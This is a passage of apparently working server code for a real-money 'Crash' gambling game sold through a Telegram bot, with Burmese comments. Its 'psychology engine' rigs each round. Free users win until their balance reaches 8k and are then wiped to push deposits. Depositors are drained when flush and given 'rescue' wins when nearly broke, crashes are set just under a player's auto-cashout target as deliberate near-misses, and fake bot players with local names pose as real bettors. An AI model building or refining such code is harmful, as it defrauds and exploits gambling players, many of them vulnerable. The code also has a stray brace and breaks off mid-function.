/**
 * ═══════════════════════════════════════════════════════════════════════════
 *  CRASH PRO — server.js  v8.0
 *
 *  ADVANCED PSYCHOLOGY ENGINE:
 *
 *  FREE USER PATH (no deposit ever):
 *   bal 1k–7.9k  → FREE_NURSE : crash ရှားသည် (8% only)  → 8k ထိတက်
 *   bal ≥ 8k     → FREE_DRAIN : 60% wipe + near-miss      → ငွေသွင်းဖို့ stimulate
 *
 *  PAID USER PATH (deposited ≥1 time):
 *   bal < 500    → DEP_RESCUE : 65% win                   → မဆေါ့ပြေးစေ
 *   bal 500–7.9k, bet ≤1500 → DEP_NURSE  : 45% good win   → ဖြည်းဖြည်းတည်ဆောက်
 *   bal 500–7.9k, bet >1500 → DEP_MID    : 45% drain loss  → moderate drain
 *   bal ≥ 8k     → DEP_DRAIN : 68% wipe                   → full take-back
 *
 *  NEAR-MISS ENGINE:
 *   User auto-cashout ≥2.0 set? → crash at (target-0.01) to (target-0.12)
 *   "ဟာ... နည်းနည်းလေးပဲလိုတာ!" → dopamine loop
 *
 *  CHASING-LOSS MERCY:
 *   3+ losses + bet ×1.5 bigger → mercy win 1.45–2.50x (once)
 *
 *  TWO POOLS: free (Seg A+C) | paid (Seg B) — completely separate rounds
 * ═══════════════════════════════════════════════════════════════════════════
 */

'use strict';

const express            = require('express');
const http               = require('http');
const { Server }         = require('socket.io');
const mongoose           = require('mongoose');
const cors               = require('cors');
const dotenv             = require('dotenv');
const { Telegraf, Markup } = require('telegraf');

dotenv.config();

const app    = express();
const server = http.createServer(app);

const ALLOWED_ORIGINS = [
  'https://crash-gamemoney.vercel.app',
  'http://localhost:3000',
];

const io = new Server(server, {
  cors: { origin: ALLOWED_ORIGINS, credentials: true },
  transports: ['websocket', 'polling'],
  pingInterval: 10000,
  pingTimeout:  5000,
});

app.use(cors({ origin: ALLOWED_ORIGINS, credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── Telegram Bot ──────────────────────────────────────────────────────────────
const bot       = new Telegraf(process.env.BOT_TOKEN || 'dummy');
const ADMIN_IDS = (process.env.ADMIN_IDS || '').split(',').filter(Boolean);

const BOT_USERNAME    = process.env.BOT_USERNAME || 'pitesansharkyamal_bot';
const GAME_URL        = 'https://crash-gamemoney.vercel.app';
const ADMIN_PANEL_URL = 'https://crash-gamemoney.vercel.app/admin.html';

// ─── MongoDB ───────────────────────────────────────────────────────────────────
let dbReady = false;
async function connectDB() {
  try {
    await mongoose.connect(process.env.MONGO_URI, {
      useNewUrlParser: true, useUnifiedTopology: true,
      serverSelectionTimeoutMS: 5000,
    });
    dbReady = true;
    console.log('✅ MongoDB connected');
  } catch (err) {
    console.error('❌ MongoDB failed, retry 5s…', err.message);
    setTimeout(connectDB, 5000);
  }
}
mongoose.connection.on('disconnected', () => { dbReady = false; setTimeout(connectDB, 3000); });
mongoose.connection.on('reconnected',  () => { dbReady = true; });
connectDB();

// ─── Schemas ───────────────────────────────────────────────────────────────────
const userSchema = new mongoose.Schema({
  telegramId:     { type: String, required: true, unique: true, index: true },
  username:       String, firstName: String, lastName: String,
  balance:        { type: Number, default: 1000, min: 0 },
  totalDeposited: { type: Number, default: 0 },
  totalWithdrawn: { type: Number, default: 0 },
  totalBets:      { type: Number, default: 0 },
  totalWins:      { type: Number, default: 0 },
  isBanned:       { type: Boolean, default: false },
  bannedAt:       Date,
  banReason:      String,
  referredBy:     { type: String, default: null },
  referralCount:  { type: Number, default: 0 },
  createdAt:      { type: Date, default: Date.now },
  lastActive:     { type: Date, default: Date.now },
  // ★ Segmentation tracking
  segment:        { type: String, enum: ['free','depositor'], default: 'free' },
  peakBalance:    { type: Number, default: 1000 }, // highest balance ever reached
});

const betSchema = new mongoose.Schema({
  userId:            { type: String, index: true }, username: String,
  amount:            Number, cashoutMultiplier: Number,
  startedAt:         Date, cashedAt: Date,
  gameId:            { type: String, index: true },
  profit:            Number,
  status:            { type: String, enum: ['pending','won','lost'], default: 'pending' },
  pool:              { type: String, enum: ['free','paid','bot'], default: 'free' },
});

const transactionSchema = new mongoose.Schema({
  userId:        { type: String, index: true }, username: String,
  type:          { type: String, enum: ['deposit','withdraw','referral','bonus'] },
  amount:        Number,
  status:        { type: String, enum: ['pending','confirmed','rejected'], default: 'pending' },
  accountName:   String, accountNumber: String,
  adminNote:     String, confirmedBy:   String, confirmedAt: Date,
  note:          String,
  createdAt:     { type: Date, default: Date.now },
});

const refLogSchema = new mongoose.Schema({
  referrerId:      { type: String, index: true },
  refereeId:       { type: String, unique: true },
  refereeUsername: String,
  bonusPaid:       { type: Number, default: 100 },
  createdAt:       { type: Date, default: Date.now },
});

const User        = mongoose.model('User',        userSchema);
const Bet         = mongoose.model('Bet',         betSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);
const RefLog      = mongoose.model('RefLog',      refLogSchema);

// ═══════════════════════════════════════════════════════════════════════════
//  v8.0 — ADVANCED PLAYER PSYCHOLOGY ENGINE
//
//  FREE USER PATH (totalDeposited = 0):
//   balance 1k–7.9k → FREE_NURSE  : ငွေတက်လာအောင် တွန်းပေး (crash ရှားသည်)
//   balance ≥ 8k    → FREE_DRAIN  : ငွေသွင်းရ stimulate (crash မြင့်သည်)
//   + Near-miss mechanic always on for FREE pool
//
//  PAID USER PATH (totalDeposited > 0):
//   balance 500–7.9k + bet ≤ 1500  → DEP_NURSE  : bet ငယ်ကစားနေ → ဖြည်းဖြည်းတည်ဆောက်
//   balance 500–7.9k + bet > 1500  → DEP_MID    : ဝင်ငွေကောင်း → moderate drain
//   balance ≥ 8k                   → DEP_DRAIN  : ငွေပြည့် → full drain
//   balance < 500                  → DEP_RESCUE : ဆုံးတော့မည် → small win ပေး (မဆေါ့ပြေးစေ)
//
//  NEAR-MISS ENGINE (ψ):
//   User auto-cashout ≥ 2.0x set? → crash at (target − 0.01) to (target − 0.12) randomly
//   Creates "so close!" dopamine loop
//
//  CHASING-LOSS DETECTOR:
//   3+ consecutive losses with growing bet → DEP_MID crash softened once ("mercy round")
// ═══════════════════════════════════════════════════════════════════════════

// ── Segment classifier ────────────────────────────────────────────────────────
/**
 * getPlayerSegment
 * @param {number} balance
 * @param {number} totalDeposited
 * @param {number} betAmount  current round bet
 * @returns {string}
 */
function getPlayerSegment(balance, totalDeposited, betAmount = 0) {
  if (totalDeposited === 0) {
    if (balance < 8000) return 'FREE_NURSE';
    return 'FREE_DRAIN';
  }
  // Paid users
  if (balance < 500)  return 'DEP_RESCUE';
  if (balance >= 8000) return 'DEP_DRAIN';
  // 500–7999
  if (betAmount <= 1500) return 'DEP_NURSE';
  return 'DEP_MID';
}

// ── House config ──────────────────────────────────────────────────────────────
const HOUSE = {

  // ── FREE_NURSE: free user building up (1k → 8k target) ───────────────────
  // Very generous — user must feel lucky & confident
  FREE_NURSE: {
    epic:     { rate: 0.12, min: 3.50, max: 8.00 },  // 12% — real excitement
    good:     { rate: 0.55, min: 1.50, max: 3.50 },  // 55% — solid win
    small:    { rate: 0.25, min: 1.10, max: 1.49 },  // 25% — tiny win (still win)
    loss:     {             min: 1.00, max: 1.08 },  //  8% — rare small loss
  },

  // ── FREE_DRAIN: free user hit 8k → drain to force deposit ────────────────
  FREE_DRAIN: {
    wipe:     { rate: 0.60, min: 1.00, max: 1.06 },  // 60% — hard wipe
    near:     { rate: 0.30, min: 1.07, max: 1.18 },  // 30% — near-miss pain
    mercy:    {             min: 1.20, max: 1.55 },  // 10% — mercy to keep hope
  },

  // ── DEP_RESCUE: depositor almost broke → give a win to prevent quit ───────
  DEP_RESCUE: {
    good:     { rate: 0.65, min: 1.40, max: 2.80 },  // 65% — relief win
    small:    { rate: 0.25, min: 1.10, max: 1.39 },  // 25% — small win
    loss:     {             min: 1.00, max: 1.09 },  // 10% — rare loss (keep depositing)
  },

  // ── DEP_NURSE: depositor, bet ≤1500, balance <8k → grow slowly ───────────
  DEP_NURSE: {
    good:     { rate: 0.45, min: 1.40, max: 2.50 },  // 45% — nice win
    small:    { rate: 0.35, min: 1.15, max: 1.39 },  // 35% — small win
    loss:     {             min: 1.00, max: 1.14 },  // 20% — loss (not too harsh)
  },

  // ── DEP_MID: depositor, bet >1500, balance <8k → moderate drain ──────────
  DEP_MID: {
    good:     { rate: 0.20, min: 1.50, max: 2.50 },  // 20% — occasional win
    near:     { rate: 0.35, min: 1.20, max: 1.49 },  // 35% — near-miss zone
    loss:     {             min: 1.00, max: 1.19 },  // 45% — drain losses
  },

  // ── DEP_DRAIN: depositor, balance ≥8k → full take-back mode ──────────────
  DEP_DRAIN: {
    wipe:     { rate: 0.68, min: 1.00, max: 1.05 },  // 68% — crushing wipe
    near:     { rate: 0.24, min: 1.06, max: 1.20 },  // 24% — tantalizing near-miss
    mercy:    {             min: 1.21, max: 1.45 },  //  8% — rare mercy win
  },

  // ── System ───────────────────────────────────────────────────────────────
  HIGH_BET_THRESHOLD:      30000,
  PRESSURE_BALANCE_LIMIT:  3000,
  PRESSURE_WIPE_RATE:      0.85,
  DRAIN_THRESHOLD:         8000,   // balance ≥ this → drain mode
};

let houseBalance = 500000;

// In-memory per-user cache: { balance, totalDeposited, lastBetAmt, consecutiveLosses, lastCrashSeen }
const userInfoCache = new Map();

function r2(n) { return Math.round(n * 100) / 100; }
const rand = () => Math.random();

// ── Near-miss helper ──────────────────────────────────────────────────────────
// If a user has an auto-cashout target ≥ 2.0x set, crash just below it
// autoCashoutTargets: Map userId → target multiplier (set by client)
const autoCashoutTargets = new Map();

function nearMissCrash(realUserIds) {
  // Find the highest auto-cashout target among real users in this round
  let highestTarget = 0;
  for (const uid of realUserIds) {
    const t = autoCashoutTargets.get(uid) || 0;
    if (t > highestTarget) highestTarget = t;
  }
  if (highestTarget >= 2.0) {
    // Crash between (target - 0.12) and (target - 0.01)
    const miss = 0.01 + rand() * 0.11;
    const cp   = r2(Math.max(1.10, highestTarget - miss));
    console.log(`🎯 NEAR-MISS: target=${highestTarget} → crash=${cp}`);
    return cp;
  }
  return null;
}

// ── Chasing-loss mercy ────────────────────────────────────────────────────────
// Track consecutive losses per user; mercy round if ≥3 losses with rising bets
function shouldGrantMercy(uid, currentBet) {
  const info = userInfoCache.get(uid);
  if (!info) return false;
  if (info.consecutiveLosses >= 3 && currentBet >= info.lastBetAmt * 1.5) {
    console.log(`💝 MERCY round for ${uid} (${info.consecutiveLosses} consec losses)`);
    return true;
  }
  return false;
}

// ── Main crash point engine ────────────────────────────────────────────────────
function calculateCrashPoint(totalUserBets = 0, hasRealUser = false, realUserIds = [], realUserBets = {}) {

  // 1. High bet pool → wipe
  if (totalUserBets >= HOUSE.HIGH_BET_THRESHOLD) {
    console.log(`💣 HIGH BET WIPE (pool=${totalUserBets})`);
    return 1.00;
  }

  // 2. House pressure
  if (houseBalance < HOUSE.PRESSURE_BALANCE_LIMIT) {
    if (rand() < HOUSE.PRESSURE_WIPE_RATE) return 1.00;
    return r2(1.01 + rand() * 0.09);
  }

  // 3. Bot-only round — diverse history so it looks real
  if (!hasRealUser) {
    const roll = rand();
    if (roll < 0.18) return 1.00;
    if (roll < 0.42) return r2(1.10 + rand() * 0.70);
    if (roll < 0.68) return r2(1.80 + rand() * 1.50);
    if (roll < 0.87) return r2(3.30 + rand() * 4.70);
    return r2(8.00 + rand() * 7.00);
  }

  // 4. Real users present — determine dominant segment
  const segPriority = { FREE_NURSE:0, DEP_RESCUE:1, DEP_NURSE:2, DEP_MID:3, FREE_DRAIN:4, DEP_DRAIN:5 };
  let dominant = 'FREE_NURSE';
  let dominantUid = null;
  let dominantBet = 0;

  for (const uid of realUserIds) {
    const info   = userInfoCache.get(uid) || {};
    const betAmt = realUserBets[uid] || info.lastBetAmt || 0;
    const seg    = getPlayerSegment(info.balance || 0, info.totalDeposited || 0, betAmt);

    // Check mercy override first
    if (shouldGrantMercy(uid, betAmt)) {
      // Override to rescue mode temporarily
      console.log(`🎀 MERCY OVERRIDE for ${uid}`);
      return r2(1.45 + rand() * 1.05); // 1.45–2.50 mercy win
    }

    if (segPriority[seg] > segPriority[dominant]) {
      dominant    = seg;
      dominantUid = uid;
      dominantBet = betAmt;
    }
  }

  // 5. Near-miss check for drain segments
  if (dominant === 'DEP_DRAIN' || dominant === 'FREE_DRAIN' || dominant === 'DEP_MID') {
    const nm = nearMissCrash(realUserIds);
    if (nm) return nm;
  }

  console.log(`🎯 [${dominant}] users=${realUserIds.length} pool=${totalUserBets}`);
  return applyCrashMode(dominant);
}

function applyCrashMode(segment) {
  const cfg  = HOUSE[segment];
  const roll = rand();

  switch (segment) {
    case 'FREE_NURSE': {
      if (roll < cfg.epic.rate)                        return r2(cfg.epic.min  + rand()*(cfg.epic.max  - cfg.epic.min));
      if (roll < cfg.epic.rate + cfg.good.rate)        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
      if (roll < cfg.epic.rate + cfg.good.rate + cfg.small.rate) return r2(cfg.small.min + rand()*(cfg.small.max - cfg.small.min));
      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
    }
    case 'FREE_DRAIN':
    case 'DEP_DRAIN': {
      if (roll < cfg.wipe.rate)                        return r2(cfg.wipe.min  + rand()*(cfg.wipe.max  - cfg.wipe.min));
      if (roll < cfg.wipe.rate + cfg.near.rate)        return r2(cfg.near.min  + rand()*(cfg.near.max  - cfg.near.min));
      return r2(cfg.mercy.min + rand()*(cfg.mercy.max - cfg.mercy.min));
    }
    case 'DEP_RESCUE': {
      if (roll < cfg.good.rate)                        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
      if (roll < cfg.good.rate + cfg.small.rate)       return r2(cfg.small.min + rand()*(cfg.small.max - cfg.small.min));
      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
    }
    case 'DEP_NURSE': {
      if (roll < cfg.good.rate)                        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
      if (roll < cfg.good.rate + cfg.small.rate)       return r2(cfg.small.min + rand()*(cfg.small.max - cfg.small.min));
      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
    }
    case 'DEP_MID': {
      if (roll < cfg.good.rate)                        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
      if (roll < cfg.good.rate + cfg.near.rate)        return r2(cfg.near.min  + rand()*(cfg.near.max  - cfg.near.min));
      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
    }
    default:
      return r2(1.20 + rand() * 0.80);
  }
}

function generateDemoCrashPoint() {
  // Demo shows exciting numbers to entice betting
  const roll = rand();
  if (roll < 0.30) return r2(2.50 + rand() * 3.00);   // 2.5x–5.5x
  if (roll < 0.65) return r2(5.50 + rand() * 4.50);   // 5.5x–10x
  return r2(10.0  + rand() * 5.00);                    // 10x–15x
}
}

// ═══════════════════════════════════════════════════════════════════════════
//  BOT POOL
// ═══════════════════════════════════════════════════════════════════════════
const MYANMAR_BOT_NAMES = [
  "Seint Seint","Kyaw Kyaw","Aye Aye","Phyo Phyo","Su Su",
  "Mg Mg","Zaw Zaw","Hla Hla","Mya Mya","Tun Tun",
  "Thidar","Nilar","Zayar","Kaung Kaung","Htet Htet",
  "Thet Thet","Myo Myo","Wutyi","Thae Thae","Chit Chit",
  "Aung Aung","Bo Bo","Thiha","Min Min","Lin Lin",
  "Howmah_jsksn","Htuneaing","Zay_Yar_99","Ko_Latt_Pro","Mm_K_77",
  "X_Aung_X","Lion_Heart_MM","Shadow_K","Dark_Moon_Htut","K_Phyo_88",
  "Sweet_Yoon","Rose_Mi","Sky_Walker_Kyaw","Mg_Thura_007","Lucky_Win_Mg",
  "J_Don_2024","Phoe_Wa_7","Black_Tiger_Ko","King_Aung_Gyi","Lady_Rose_9",
  "Zay Yar Htet","Yoon Wadi","Thoon Thadi","Eaindra","May Thu",
  "Htet Arkar","Wai Yan","Sithu","Kaung Sett","Hein Htet",
  "Pyae Phyo","Thant Sin","Yan Naing","Kyaw Zayar","Pyae Sone",
  "Nay Chi","Hnin Oo","Ei Ei","Wai Wai","Khin Khin",
  "Pro_Gamer_Ko","King_MMK","Jackpot_Aung","Lucky_7_Mg","Win_Win_Ko",
  "Tiger_Kyaw","Dragon_Phyo","Phoenix_Su","Wolf_Zaw","Eagle_Min",
  "Ace_Htet","Boss_Aung","Chief_Bo","Maverick_Mg","Ninja_Ko",
];
const STRAT_POOL = ['early','early','early','medium','medium','medium','medium','late','late','random'];
const BOT_POOL   = new Map();
const BOT_ARRAY  = [];
MYANMAR_BOT_NAMES.forEach((name, i) => {
  const obj = { id:`bot_${i}`, username:name, balance:3000+Math.floor(rand()*12000), strategy:STRAT_POOL[i%STRAT_POOL.length], lastRound:-1 };
  BOT_POOL.set(obj.id, obj); BOT_ARRAY.push(obj);
});
console.log(`🤖 Bot pool: ${BOT_POOL.size} bots`);

function shuffleSlice(arr, count) {
  const copy = arr.slice();
  for (let i = copy.length-1; i > 0; i--) {
    const j = Math.floor(rand()*(i+1)); [copy[i], copy[j]] = [copy[j], copy[i]];
  }
  return copy.slice(0, Math.min(count, copy.length));
}

// ═══════════════════════════════════════════════════════════════════════════
//  GAME STATE
//  ★ TWO SEPARATE GAME POOLS run simultaneously:
//    G_FREE : for free/new users (Seg A + C)
//    G_PAID : for depositors    (Seg B)
//  Each pool has its own crash point, bets, and round.
// ═══════════════════════════════════════════════════════════════════════════
const COUNTDOWN_SECONDS  = 5;
const MULTIPLIER_TICK_MS = 50;
const BETWEEN_GAME_MS    = 3000;
const GROWTH_RATE        = 0.08;
const TOTAL_PLAYERS      = 6;
const MIN_WITHDRAWAL     = 10000;
const REF_BONUS          = 100;

let roundCounter = 0;

function createFreshPool(poolName) {
  return {
    poolName,
    phase:             'idle',
    gameId:            null,
    crashPoint:        0,
    currentMultiplier: 1.0,
    startTime:         null,
    bets:              new Map(),
    totalBetsAmount:   0,
    totalUserBets:     0,
    hasRealUser:       false,
    realUserIds:       [],
    realUserBets:      {},   // userId → betAmount for this round
    history:           [],
  };
}

// Two pools
let G_FREE = createFreshPool('free');  // Segment A + C
let G_PAID = createFreshPool('paid');  // Segment B (depositors)

// Map each connected socket/user → which pool they belong to
const userPoolMap = new Map(); // userId → 'free' | 'paid'

const sleep          = ms => new Promise(r => setTimeout(r, ms));
const generateGameId = () => Date.now().toString(36) + Math.random().toString(36).slice(2, 8);

function getPool(userId) {
  const pool = userPoolMap.get(userId);
  return pool === 'paid' ? G_PAID : G_FREE;
}

function activeBetsSnapshot(G) {
  const out = [];
  for (const b of G.bets.values()) if (!b.cashedAt) out.push({ username:b.username, amount:b.amount, isBot:b.isBot });
  return out;
}

// ═══════════════════════════════════════════════════════════════════════════
//  TELEGRAM BOT
// ═══════════════════════════════════════════════════════════════════════════
async function notifyAdmins(text) {
  for (const aid of ADMIN_IDS) { try { await bot.telegram.sendMessage(aid, text, { parse_mode:'HTML' }); } catch {} }
}

bot.start(async (ctx) => {
  try {
    const from     = ctx.from;
    const tid      = String(from.id);
    const name     = from.first_name || from.username || 'ဂုဏ်ယူသောကစားသမား';
    const username = from.username
      || `${from.first_name ?? ''}${from.last_name ? ' '+from.last_name : ''}`.trim()
      || `User_${tid.slice(-4)}`;

    const payload    = ctx.startPayload || '';
    const referrerId = payload.startsWith('ref_') ? payload.slice(4) : null;

    const existing = await User.findOne({ telegramId: tid });
    let isNew = false;

    if (!existing) {
      isNew = true;
      await User.create({
        telegramId: tid, username, firstName: from.first_name, lastName: from.last_name,
        balance: 1000, referredBy: referrerId && referrerId !== tid ? referrerId : null,
      });

      if (referrerId && referrerId !== tid) {
        const already = await RefLog.findOne({ refereeId: tid });
        if (!already) {
          const referrer = await User.findOneAndUpdate(
            { telegramId: referrerId },
            { $inc: { balance: REF_BONUS, referralCount: 1 } },
            { new: true }
          );
          if (referrer) {
            await RefLog.create({ referrerId, refereeId: tid, refereeUsername: username, bonusPaid: REF_BONUS });
            io.emit('balanceUpdate', { userId: referrerId, balance: referrer.balance });
            try { await bot.telegram.sendMessage(referrerId,
              `🎉 <b>သူငယ်ချင်း ဖိတ်ခေါ်မှု အောင်မြင်!</b>\n👤 <b>${username}</b> သင့် Link မှ ဝင်!\n💰 <b>+${REF_BONUS} MMK</b>`,
              { parse_mode:'HTML' }); } catch {}
          }
        }
      }

      await notifyAdmins(`🆕 <b>User အသစ်!</b>\n👤 ${username} [<code>${tid}</code>]\n🔗 Ref: ${referrerId||'မရှိ'}`);
      console.log(`🆕 New: ${username}(${tid}) ref=${referrerId}`);
    } else {
      if (existing.isBanned) return ctx.reply('⛔ Account ပိတ်ထားသည်');
      existing.lastActive = new Date(); await existing.save();
    }

    const kb = Markup.inlineKeyboard([
      [Markup.button.webApp('🎮 Play Now', GAME_URL)],
      [Markup.button.url('💌 Channel', 'https://t.me/EzMoneyPayy'),
       Markup.button.url('💬 Support', 'https://t.me/EzMoneyyadmin')],
    ]);

    if (isNew) {
      await ctx.replyWithHTML(`🎉 <b>ကြိုဆိုပါတယ် ${name}!</b>\n\n🎁 ကြိုဆိုလက်ဆောင် <b>1,000 ကျပ်</b> ရရှိပါသည်။\n\n💰 ပိုက်ဆံရှာပြီး ဂိမ်းကစားရန် <b>Play</b> button ကိုနှိပ်ပါ။`, kb);
    } else {
      await ctx.replyWithHTML(`🎉 <b>ပြန်လည် ကြိုဆိုပါတယ် ${name}!</b>\n\n💰 ပိုက်ဆံရှာပြီး ဂိမ်းကစားရန် <b>Play</b> button ကိုနှိပ်ပါ။`, kb);
    }
  } catch (e) { console.error('/start:', e.message); }
});

bot.command('admin', async ctx => {
  if (!ADMIN_IDS.includes(String(ctx.from.id))) return ctx.reply('⛔ Admin access မရှိ');
  await ctx.replyWithHTML(`🔐 <b>Admin Panel</b>`,
    Markup.inlineKeyboard([[Markup.button.webApp('⚙️ Admin Panel', ADMIN_PANEL_URL)]]));
});

bot.command('balance', async ctx => {
  try {
    const u = await User.findOne({ telegramId: String(ctx.from.id) });
    if (!u) return ctx.reply('❌ /start ကိုနှိပ်ပါ');
    const seg = getPlayerSegment(u.balance, u.totalDeposited, 0);
    await ctx.replyWithHTML(`💰 Balance: <b>${u.balance.toLocaleString()} MMK</b>\n🎮 Mode: ${seg}`);
  } catch {}
});

bot.command('ref', async ctx => {
  try {
    const tid  = String(ctx.from.id);
    const link = `https://t.me/${BOT_USERNAME}?start=ref_${tid}`;
    const cnt  = await RefLog.countDocuments({ referrerId: tid });
    await ctx.replyWithHTML(
      `👥 <b>Referral</b>\n\n🔗 <code>${link}</code>\n\n👤 ဖိတ်ပြီး: <b>${cnt}</b> ယောက်\n🎁 တစ်ယောက်တိုင်း +${REF_BONUS} MMK`,
      Markup.inlineKeyboard([[Markup.button.url('📤 Share', `https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent('🎮 Crash Game — 1000ကျပ် ရမည်!')}`)]])
    );
  } catch {}
});

// Forward user text to admins
bot.on('text', async ctx => {
  const tid = String(ctx.from.id);
  if (ADMIN_IDS.includes(tid)) return;
  const text = ctx.message.text;
  if (text.startsWith('/')) return;
  const name = ctx.from.username || ctx.from.first_name || tid;
  const u = await User.findOne({ telegramId: tid });
  const bal = u ? u.balance.toLocaleString()+' MMK' : 'N/A';
  await notifyAdmins(`📨 <b>User Message</b>\n👤 ${name} [<code>${tid}</code>] Balance: ${bal}\n\n"${text}"\n\nReply: /api/admin/send-message`);
  await ctx.reply('✅ Admin ထံ ပို့ပြီး');
});

// ═══════════════════════════════════════════════════════════════════════════
//  GAME LOOP — runs TWO pools in parallel
// ═══════════════════════════════════════════════════════════════════════════
async function startGameLoop() {
  console.log('🎮 Game loops started (FREE + PAID pools)');
  // Run both pools concurrently — they operate independently
  await Promise.all([
    runPoolLoop(G_FREE),
    runPoolLoop(G_PAID),
  ]);
}

async function runPoolLoop(G) {
  while (true) {
    try {
      await runCountdown(G);
      await runGame(G);
      await sleep(BETWEEN_GAME_MS);
    } catch (e) {
      console.error(`🔥 [${G.poolName}] Loop error:`, e.message);
      await sleep(2000);
    }
  }
}

async function runCountdown(G) {
  roundCounter++;
  G.bets = new Map(); G.totalBetsAmount=0; G.totalUserBets=0;
  G.hasRealUser=false; G.realUserIds=[]; G.realUserBets={}; G.currentMultiplier=1.0;
  G.phase='countdown'; G.gameId=generateGameId(); G.crashPoint=0;

  // Emit to the correct pool room
  io.to(G.poolName).emit('countdown', { seconds:COUNTDOWN_SECONDS, gameId:G.gameId, demoPoint:generateDemoCrashPoint(), pool:G.poolName });

  // Bot bets placed after short delay (only in FREE pool for social proof)
  if (G.poolName === 'free') {
    setTimeout(() => placeBotBets(G), 600 + Math.floor(rand()*900));
  } else {
    // PAID pool — fewer bots so it feels more "real"
    setTimeout(() => placeBotBets(G, 3), 800 + Math.floor(rand()*700));
  }

  await sleep(COUNTDOWN_SECONDS * 1000);

  G.crashPoint = calculateCrashPoint(G.totalUserBets, G.hasRealUser, G.realUserIds, G.realUserBets);
  console.log(`📊 [${G.poolName}] Round ${roundCounter} crash=${G.crashPoint}x userBets=${G.totalUserBets} house=${houseBalance}`);
}

async function runGame(G) {
  G.phase='running'; G.startTime=Date.now();
  io.to(G.poolName).emit('gameStart', { gameId:G.gameId, bets:activeBetsSnapshot(G), pool:G.poolName });

  if (G.crashPoint <= 1.00) {
    G.currentMultiplier=1.00;
    io.to(G.poolName).emit('multiplier', { multiplier:1.00, phase:'running', ts:Date.now(), pool:G.poolName });
    await sleep(300);
    await crashGame(G);
    return;
  }

  while (G.phase === 'running') {
    const elapsed = (Date.now()-G.startTime)/1000;
    const mult    = r2(Math.pow(Math.E, GROWTH_RATE*elapsed));
    G.currentMultiplier = mult;

    if (mult >= G.crashPoint) {
      G.currentMultiplier = G.crashPoint;
      io.to(G.poolName).emit('multiplier', { multiplier:G.currentMultiplier, phase:'running', ts:Date.now(), pool:G.poolName });
      await crashGame(G); break;
    }

    io.to(G.poolName).emit('multiplier', { multiplier:mult, phase:'running', ts:Date.now(), pool:G.poolName });
    processBotCashouts(G);
    await sleep(MULTIPLIER_TICK_MS);
  }
}

async function crashGame(G) {
  G.phase='crashed';
  console.log(`💥 [${G.poolName}] @ ${G.crashPoint}x`);

  let profit = 0;
  const losses = [];
  for (const [uid, bet] of G.bets.entries()) {
    if (!bet.cashedAt) { if (!bet.isBot) profit += bet.amount; losses.push(processBetLoss(uid, bet, G)); }
    else if (!bet.isBot) profit -= (bet.profit ?? 0);
  }
  await Promise.allSettled(losses);
  houseBalance = Math.max(0, houseBalance+profit);

  G.history.unshift({ gameId:G.gameId, crashPoint:G.crashPoint, totalBets:G.totalBetsAmount, timestamp:Date.now() });
  if (G.history.length > 50) G.history.length = 50;

  io.to(G.poolName).emit('gameCrashed', { multiplier:G.crashPoint, gameId:G.gameId, pool:G.poolName });
}

// ═══════════════════════════════════════════════════════════════════════════
//  PLACE BET
// ═══════════════════════════════════════════════════════════════════════════
async function placeBet(userId, username, amount) {
  // Determine which pool user belongs to
  const G = getPool(userId);

  if (G.phase !== 'countdown') {
    return { success:false, message: G.phase==='running' ? 'ဂိမ်းစပြီးပါပြီ' : 'Countdown မစသေးပါ' };
  }
  if (G.bets.has(userId)) return { success:false, message:'ဤပတ်တွင် Bet လောင်းပြီးပါပြီ' };

  amount = Number(amount);
  if (!Number.isFinite(amount) || amount <= 0) return { success:false, message:'ငွေပမာဏ မမှန်ကန်' };
  if (!dbReady) return { success:false, message:'Server မသင့်တော်သေးပါ' };

  try {
    const user = await User.findOneAndUpdate(
      { telegramId:userId, balance:{$gte:amount}, isBanned:false },
      { $inc:{balance:-amount, totalBets:1}, $set:{lastActive:new Date()} },
      { new:true }
    );
    if (!user) {
      const ex = await User.findOne({ telegramId:userId });
      if (!ex)         return { success:false, message:'User not found' };
      if (ex.isBanned) return { success:false, message:'Account banned' };
      return { success:false, message:'လက်ကျန်မလုံလောက်' };
    }

    const bet = { userId, username, amount, isBot:false, gameId:G.gameId, placedAt:Date.now(), cashedAt:null, cashoutMultiplier:null, profit:null };
    G.bets.set(userId, bet);
    G.totalBetsAmount += amount; G.totalUserBets += amount;
    if (!G.hasRealUser) G.hasRealUser = true;
    if (!G.realUserIds.includes(userId)) G.realUserIds.push(userId);
    G.realUserBets[userId] = amount; // ★ track per-user bet for segment engine

    // Update balance cache with full user info for segment decisions
    userInfoCache.set(userId, {
      balance:          user.balance,
      totalDeposited:   user.totalDeposited,
      lastBetAmt:       amount,
      consecutiveLosses: (userInfoCache.get(userId)?.consecutiveLosses || 0),
    });

    io.emit('balanceUpdate', { userId, balance:user.balance });
    io.to(G.poolName).emit('activeBets', { bets:activeBetsSnapshot(G), pool:G.poolName });
    return { success:true, newBalance:user.balance, pool:G.poolName };
  } catch (e) { console.error('placeBet:', e); return { success:false, message:'Server error' }; }
}

// ═══════════════════════════════════════════════════════════════════════════
//  CASH OUT
// ═══════════════════════════════════════════════════════════════════════════
async function cashOut(userId, clientMultiplier, clientGameId) {
  const G = getPool(userId);

  if (G.phase !== 'running') return { success:false, message:'ဂိမ်း Crash ဖြစ်သွားပြီ' };
  if (clientGameId && clientGameId !== G.gameId) return { success:false, message:'Game session မမှန်' };

  const bet = G.bets.get(userId);
  if (!bet)         return { success:false, message:'Active bet မရှိပါ' };
  if (bet.cashedAt) return { success:false, message:'ရပြီးသားဖြစ်သည်' };

  bet.cashedAt = Date.now();
  const multiplier  = Math.min(parseFloat(clientMultiplier)||G.currentMultiplier, G.currentMultiplier);
  const profit      = r2(bet.amount * (multiplier-1));
  const totalReturn = bet.amount + profit;
  bet.cashoutMultiplier = multiplier; bet.profit = profit;

  try {
    const user = await User.findOneAndUpdate(
      { telegramId:userId },
      { $inc:{ balance:totalReturn, totalWins:1 } },
      { new:true }
    );
    if (user) {
      // Update peak balance
